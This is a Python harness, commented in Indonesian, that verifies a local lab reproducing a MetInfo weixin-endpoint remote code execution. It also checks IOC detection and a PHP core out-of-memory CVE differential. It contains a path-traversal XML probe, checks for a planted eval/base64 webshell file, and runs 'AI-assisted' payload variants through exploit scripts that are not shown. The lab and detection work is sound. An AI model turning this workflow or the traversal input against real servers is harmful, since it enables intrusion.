#!/usr/bin/env python3
"""
Verifikasi end-to-end lab RCE PHP.

Menjalankan serangkaian pemeriksaan dan keluar dengan kode 0 hanya bila SEMUA
langkah kritis lolos:

  1. Lab server (php -S) menyala di 127.0.0.1:8099
  2. Endpoint MetInfo meniru perilaku produksi (200 + 'success')
  3. Tahap 1 exploit menulis file cache/weixin/Array.php (write primitive)
  4. Tahap 2 exploit mengeksekusi perintah -> RCE terbukti
  5. Semua 6 varian payload AI-assisted berhasil (payload_gen --validate)
  6. Deteksi IOC menemukan artefak penyerang di filesystem
  7. (opsional) Diferensial PHP core: instance vulnerable OOM, patched tidak

Pakai:
    python3 verify/verify_lab.py
    python3 verify/verify_lab.py --start-lab        # nyalakan lab dulu
    python3 verify/verify_lab.py --skip-core         # lewati cek core CVE
    python3 verify/verify_lab.py --json
"""
import argparse
import json
import os
import re
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
LAB_DIR = os.path.join(ROOT, "lab")
EXPLOIT = os.path.join(ROOT, "exploit", "exploit.py")
PAYGEN = os.path.join(ROOT, "exploit", "payload_gen.py")
IOCHUNT = os.path.join(ROOT, "defense", "ioc_hunt.py")
CACHE_DIR = os.path.join(LAB_DIR, "app", "cache", "weixin")
ARTIFACT = os.path.join(CACHE_DIR, "Array.php")

ENDPOINT = "/app/system/entrance.php?n=include&m=module&c=weixin&a=doapi"
DEFAULT_TARGET = "http://127.0.0.1:8099"
MARK = "_____"

results = []


def record(name, ok, detail=""):
    results.append({"name": name, "ok": bool(ok), "detail": detail})
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}" + (f" -- {detail}" if detail else ""))
    return ok


def http_get(url, timeout=5):
    import urllib.request
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read().decode(errors="replace")
    except Exception as e:  # noqa: BLE001
        return None, str(e)


def start_lab(port=8099):
    """Nyalakan lab server (php -S) kalau belum jalan."""
    st, _ = http_get(f"{DEFAULT_TARGET}/app/system/entrance.php", timeout=2)
    if st is not None:
        return True, "lab sudah jalan"
    os.makedirs(CACHE_DIR, exist_ok=True)
    log_path = os.environ.get(
        "VERIFY_LAB_LOG", os.path.join(tempfile.gettempdir(), "php-rce-2026-verify.log"))
    log = open(log_path, "ab")
    subprocess.Popen(
        [sys.executable, os.path.join(LAB_DIR, "serve.py"), "--port", str(port)],
        cwd=LAB_DIR, stdout=log, stderr=subprocess.STDOUT, start_new_session=True)
    for _ in range(30):
        time.sleep(0.4)
        st, _ = http_get(f"{DEFAULT_TARGET}/app/system/entrance.php", timeout=2)
        if st is not None:
            return True, "lab dinyalakan"
    return False, "lab gagal dinyalakan"


def check_lab_up(target):
    st, body = http_get(target + ENDPOINT, timeout=5)
    return record("lab server menyala", st is not None,
                  f"HTTP {st}" if st else body[:120])


def check_endpoint(target):
    """Endpoint harus menerima POST dan membalas 'success' seperti produksi."""
    import urllib.request
    xml = ("<x><MsgType>event</MsgType><Event>SCAN</Event>"
           "<EventKey>adminlogin&#x26;../config/tables</EventKey>"
           "<FromUserName>probe</FromUserName></x>")
    req = urllib.request.Request(
        target + ENDPOINT, data=xml.encode(),
        headers={"Content-Type": "text/xml"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            body = r.read().decode(errors="replace")
            return record("endpoint meniru perilaku MetInfo", r.status == 200 and "success" in body.lower(),
                          f"HTTP {r.status} body={body[:80]!r}")
    except Exception as e:  # noqa: BLE001
        return record("endpoint meniru perilaku MetInfo", False, str(e)[:160])


def check_write_primitive():
    """Artefak yang ditulis penyerang harus ada di cache/weixin/Array.php."""
    if not os.path.exists(ARTIFACT):
        return record("write primitive (cache/weixin/Array.php)", False,
                      "file tidak ditemukan")
    data = open(ARTIFACT, errors="replace").read()
    ok = "eval" in data and "base64_decode" in data and "${" in data
    return record("write primitive (cache/weixin/Array.php)", ok,
                  f"{len(data)} byte, berisi payload: {ok}")


def check_rce(target):
    """Jalankan exploit dan pastikan output perintah benar-benar kembali."""
    try:
        p = subprocess.run(
            [sys.executable, EXPLOIT, "-t", target, "-c", "echo VERIFY-$((6*7))-$(id -u)"],
            capture_output=True, text=True, timeout=60)
    except subprocess.TimeoutExpired:
        return record("RCE (eksekusi perintah)", False, "timeout")
    out = (p.stdout or "").strip()
    ok = "VERIFY-42-" in out
    return record("RCE (eksekusi perintah)", ok, out.splitlines()[-1][:120] if out else p.stderr[:120])


def check_payload_variants(target):
    """Semua varian AI-assisted harus berhasil di lab."""
    try:
        p = subprocess.run(
            [sys.executable, PAYGEN, "-c", "echo V-$((3*3))", "--validate", "-t", target],
            capture_output=True, text=True, timeout=180)
    except subprocess.TimeoutExpired:
        return record("6 varian payload AI-assisted", False, "timeout")
    ok = "6/6" in (p.stdout or "")
    return record("6 varian payload AI-assisted", ok,
                  (p.stdout or "").strip().splitlines()[-1][:120])


def check_ioc_detection():
    """IOC hunter harus menemukan artefak penyerang di filesystem."""
    try:
        p = subprocess.run(
            [sys.executable, IOCHUNT, "--fs", os.path.join(LAB_DIR, "app", "cache")],
            capture_output=True, text=True, timeout=60)
    except subprocess.TimeoutExpired:
        return record("deteksi IOC artefak penyerang", False, "timeout")
    ok = "cache-php-payload" in (p.stdout or "")
    return record("deteksi IOC artefak penyerang", ok,
                  "critical finding" if ok else (p.stdout or "")[:120])


def check_core_diff():
    """Diferensial PHP core: 8.4.11 harus OOM, 8.4.27 harus tahan."""
    cve = os.path.join(ROOT, "core-cve")
    script = os.path.join(cve, "oom_test.py")
    if not os.path.exists(script):
        return record("diferensial PHP core (CVE-2026-109618)", False, "script tidak ada")
    st_v, _ = http_get("http://127.0.0.1:8091/info.php", timeout=3)
    st_f, _ = http_get("http://127.0.0.1:8092/info.php", timeout=3)
    if st_v is None or st_f is None:
        return record("diferensial PHP core (CVE-2026-109618)", False,
                      "instance Apache differential belum jalan (core-cve/apache_diff.sh start)")
    try:
        p = subprocess.run([sys.executable, script, "--strategy", "headers", "-n", "200000"],
                           capture_output=True, text=True, timeout=180)
    except subprocess.TimeoutExpired:
        return record("diferensial PHP core (CVE-2026-109618)", False, "timeout")
    out = p.stdout or ""
    vuln_oom = "500" in out.split("[fixed")[0]
    fixed_ok = "200 OK" in out.split("[fixed")[-1]
    return record("diferensial PHP core (CVE-2026-109618)", vuln_oom and fixed_ok,
                  f"vulnerable=OOM:{vuln_oom} patched=200:{fixed_ok}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default=DEFAULT_TARGET)
    ap.add_argument("--start-lab", action="store_true", help="nyalakan lab bila mati")
    ap.add_argument("--skip-core", action="store_true", help="lewati cek diferensial core CVE")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()

    print("== Verifikasi lab RCE PHP ==")
    if args.start_lab:
        ok, msg = start_lab()
        print(f"  [INFO] {msg}")
        if not ok:
            record("lab server menyala", False, msg)
            return 1

    check_lab_up(args.target)
    check_endpoint(args.target)
    # exploit menulis ulang artefak cache dengan payload sungguhan -> cek file
    check_rce(args.target)
    check_write_primitive()
    check_payload_variants(args.target)
    check_ioc_detection()
    if not args.skip_core:
        check_core_diff()

    passed = sum(1 for r in results if r["ok"])
    total = len(results)
    print()
    print(f"== {passed}/{total} pemeriksaan lolos ==")

    if args.json:
        print(json.dumps({"passed": passed, "total": total, "results": results},
                         indent=2, ensure_ascii=False))
    return 0 if passed == total else 1


if __name__ == "__main__":
    sys.exit(main())
